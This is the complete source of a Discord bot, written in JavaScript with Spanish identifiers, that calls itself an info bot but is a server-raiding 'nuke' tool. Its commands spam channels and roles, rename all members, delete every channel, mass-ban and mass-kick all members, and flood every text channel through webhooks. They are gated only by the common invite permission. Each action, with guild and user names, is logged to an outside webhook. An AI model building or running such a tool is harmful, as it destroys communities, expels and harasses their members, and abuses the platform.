require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, version, ChannelType, PermissionsBitField, WebhookClient } = require('discord.js');

const cliente = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const prefijo = '.';
const gancho = new WebhookClient({ url: process.env.webhook });

function registro(texto) {
  console.log(texto);
  gancho.send({ content: `\`[REGISTRO]\` ${texto}`.slice(0, 1900) }).catch(() => {});
}

cliente.once('ready', () => {
  registro(`conectado como ${cliente.user.tag}`);
  cliente.user.setActivity(`${prefijo}botinfo`, { type: 2 });
});

cliente.on('messageCreate', async (mensaje) => {
  if (mensaje.author.bot) return;
  if (!mensaje.content.startsWith(prefijo)) return;

  const argumentos = mensaje.content.slice(prefijo.length).trim().split(/ +/);
  const comando = argumentos.shift().toLowerCase();

  registro(`comando usado: ${comando} por ${mensaje.author.tag} en ${mensaje.guild? mensaje.guild.name : 'md'}`);

  if (comando === 'botinfo') {
    const tiempo = cliente.uptime;
    const dias = Math.floor(tiempo / 86400000);
    const horas = Math.floor(tiempo / 3600000) % 24;
    const minutos = Math.floor(tiempo / 60000) % 60;
    const segundos = Math.floor(tiempo / 1000) % 60;
    const memoria = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const embed = new EmbedBuilder()
     .setColor(0x5865F2)
     .setTitle(`${cliente.user.username}`)
     .setDescription('bot de informacion')
     .addFields(
        { name: 'latencia', value: `${cliente.ws.ping}ms`, inline: true },
        { name: 'activo', value: `${dias}d ${horas}h ${minutos}m ${segundos}s`, inline: true },
        { name: 'entorno', value: process.version, inline: true },
        { name: 'libreria', value: `v${version}`, inline: true },
        { name: 'memoria', value: `${memoria} mb`, inline: true },
        { name: 'pedido por', value: mensaje.author.username, inline: true }
      )
     .setTimestamp();

    mensaje.channel.send({ embeds: [embed] });
  }

  if (comando === 'channels') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para channels: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
      registro(`yo sin permiso managechannels en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso de crear canales");
    }

    registro(`iniciando creacion de 100 byresolution en ${mensaje.guild.name}`);

    const tareas = Array.from({ length: 100 }, () => () =>
      mensaje.guild.channels.create({
        name: `byresolution`,
        type: ChannelType.GuildText
      }).catch(e => registro(`error canal: ${e.message}`))
    );

    for (let i = 0; i < tareas.length; i += 5) {
      await Promise.all(tareas.slice(i, i + 5).map(fn => fn()));
    }

    registro(`100 canales byresolution creados en ${mensaje.guild.name}`);
    mensaje.channel.send(`listo, cree 100 canales byresolution`);
  }

  if (comando === 'rolecreate') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para rolecreate: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
      registro(`yo sin permiso manageroles en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso para crear roles");
    }

    const colores = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF, 0xFF8800, 0x8800FF, 0x00FF88, 0xFFFFFF];

    registro(`iniciando creacion de roles $$$ en ${mensaje.guild.name}`);

    for (let i = 0; i < colores.length; i += 3) {
      await Promise.all(
        colores.slice(i, i + 3).map(c =>
          mensaje.guild.roles.create({
            name: '$$$',
            color: c,
            reason: `creado por ${mensaje.author.tag}`
          }).catch(e => registro(`error rol ${c}: ${e.message}`))
        )
      );
    }

    registro(`roles $$ creados en ${mensaje.guild.name}`);
    mensaje.reply("listo, cree 10 roles $$ con colores distintos");
  }

  if (comando === 'massrename') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para massrename: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageNicknames)) {
      registro(`yo sin permiso managenicknames en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso para cambiar apodos");
    }

    registro(`iniciando massrename en ${mensaje.guild.name}`);

    const miembros = await mensaje.guild.members.fetch();
    const tareas = miembros.map(miembro => () =>
      miembro.setNickname('ResolutionOnTop').catch(e => {
        if (e.code !== 50013) registro(`error apodo ${miembro.user.tag}: ${e.message}`);
      })
    );

    for (let i = 0; i < tareas.length; i += 20) {
      await Promise.all(tareas.slice(i, i + 20).map(fn => fn()));
    }

    registro(`massrename completado en ${mensaje.guild.name}`);
    mensaje.reply(`listo, renombre a ${miembros.size} usuarios a ResolutionOnTop`);
  }

  if (comando === 'webhooks') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para webhooks: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageWebhooks)) {
      registro(`yo sin permiso managewebhooks en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso para crear webhooks");
    }

    registro(`iniciando creacion de webhooks en ${mensaje.guild.name}`);

    const canales = await mensaje.guild.channels.fetch();
    const tareas = canales.filter(c => c.type === ChannelType.GuildText).map(c => () =>
      c.createWebhook({
        name: 'Resolution('
      }).catch(e => registro(`error webhook en ${c.name}: ${e.message}`))
    );

    for (let i = 0; i < tareas.length; i += 20) {
      await Promise.all(tareas.slice(i, i + 20).map(fn => fn()));
    }

    registro(`webhooks creados en ${mensaje.guild.name}`);
    mensaje.reply(`listo, cree 1 webhook por cada canal de texto`);
  }

  if (comando === 'nuke') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para nuke: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
      registro(`yo sin permiso managechannels en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso para eliminar canales");
    }

    registro(`iniciando nuke en ${mensaje.guild.name}`);

    const canales = await mensaje.guild.channels.fetch();

    const eliminar = Array.from(canales.values(), c => () =>
      c.delete('nuke por ' + mensaje.author.tag).catch(e => registro(`error eliminar ${c.name}: ${e.message}`))
    );

    for (let i = 0; i < eliminar.length; i += 20) {
      await Promise.all(eliminar.slice(i, i + 20).map(fn => fn()));
    }

    await mensaje.guild.channels.create({
      name: 'nukedbyresolution',
      type: ChannelType.GuildText
    });

    registro(`nuke completado en ${mensaje.guild.name}`);
    mensaje.channel.send(`listo, elimine todos los canales y cree nukedbyresolution`);
  }

  if (comando === 'massban') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para massban: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) {
      registro(`yo sin permiso banmembers en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso para banear");
    }

    registro(`iniciando massban en ${mensaje.guild.name}`);

    const miembros = await mensaje.guild.members.fetch();
    const tareas = miembros.map(miembro => () =>
      miembro.ban({ reason: `massban por ${mensaje.author.tag}` }).catch(e => {
        if (e.code !== 50013) registro(`error ban ${miembro.user.tag}: ${e.message}`);
      })
    );

    for (let i = 0; i < tareas.length; i += 20) {
      await Promise.all(tareas.slice(i, i + 20).map(fn => fn()));
    }

    registro(`massban completado en ${mensaje.guild.name}`);
    mensaje.reply(`listo, bane a ${miembros.size} usuarios`);
  }

  if (comando === 'masskick') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para masskick: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers)) {
      registro(`yo sin permiso kickmembers en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso para expulsar");
    }

    registro(`iniciando masskick en ${mensaje.guild.name}`);

    const miembros = await mensaje.guild.members.fetch();
    const tareas = miembros.map(miembro => () =>
      miembro.kick(`masskick por ${mensaje.author.tag}`).catch(e => {
        if (e.code !== 50013) registro(`error kick ${miembro.user.tag}: ${e.message}`);
      })
    );

    for (let i = 0; i < tareas.length; i += 20) {
      await Promise.all(tareas.slice(i, i + 20).map(fn => fn()));
    }

    registro(`masskick completado en ${mensaje.guild.name}`);
    mensaje.reply(`listo, expulse a ${miembros.size} usuarios`);
  }
  if (comando === 'spamv2') {
    if (!mensaje.guild) return;
    if (!mensaje.member.permissions.has(PermissionsBitField.Flags.CreateInstantInvite)) {
      registro(`sin permiso invite para spamv2: ${mensaje.author.tag}`);
      return mensaje.reply("necesitas permiso de crear invitaciones");
    }
    if (!mensaje.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageWebhooks)) {
      registro(`yo sin permiso managewebhooks en ${mensaje.guild.name}`);
      return mensaje.reply("no tengo permiso para gestionar webhooks");
    }

    const texto = argumentos.join(' ') || 'ResolutionOnTop';

    registro(`iniciando spamv2 en ${mensaje.guild.name} con: ${texto}`);

    const canales = await mensaje.guild.channels.fetch();
    const canalesTexto = canales.filter(c => c.type === ChannelType.GuildText);

    const tareas = Array.from(canalesTexto.values(), c => () =>
      c.fetchWebhooks().then(async ganchos => {
        let gancho = ganchos.find(g => g.name === 'Resolution(');
        if (!gancho) {
          gancho = await c.createWebhook({ name: 'Resolution(' }).catch(e => registro(`error crear webhook en ${c.name}: ${e.message}`));
          if (!gancho) return;
        }
        const envios = Array.from({ length: 15 }, () => gancho.send(texto).catch(e => registro(`error spam en ${c.name}: ${e.message}`)));
        return Promise.all(envios);
      })
    );

    for (let i = 0; i < tareas.length; i += 20) {
      await Promise.all(tareas.slice(i, i + 20).map(fn => fn()));
    }

    registro(`spamv2 completado en ${mensaje.guild.name}`);
    mensaje.reply(`listo, spamee 15 veces en cada canal`);
  }
  if (comando === 'help') {
    const embed = new EmbedBuilder()
      .setColor(0x5865F2)
      .setTitle('comandos del bot')
      .setDescription('lista de comandos disponibles')
      .addFields(
        { name: '.botinfo', value: 'informacion del bot', inline: false },
        { name: '.channels', value: 'crea 100 canales byresolution', inline: false },
        { name: '.rolecreate', value: 'crea 10 roles $$$ con colores', inline: false },
        { name: '.massrename', value: 'renombra a todos a ResolutionOnTop', inline: false },
        { name: '.webhooks', value: 'crea 1 webhook por canal de texto', inline: false },
        { name: '.nuke', value: 'elimina todos los canales y crea nukedbyresolution', inline: false },
        { name: '.massban', value: 'banea a todos los miembros', inline: false },
        { name: '.masskick', value: 'expulsa a todos los miembros', inline: false },
        { name: '.spamv2', value: 'spamea 15 veces en cada canal con webhook', inline: false },
        { name: '.help', value: 'muestra esta lista', inline: false }
      )
      .setTimestamp();

    mensaje.channel.send({ embeds: [embed] });
  }
});

cliente.on('error', (e) => registro(`error cliente: ${e.message}`));

cliente.login(process.env.token);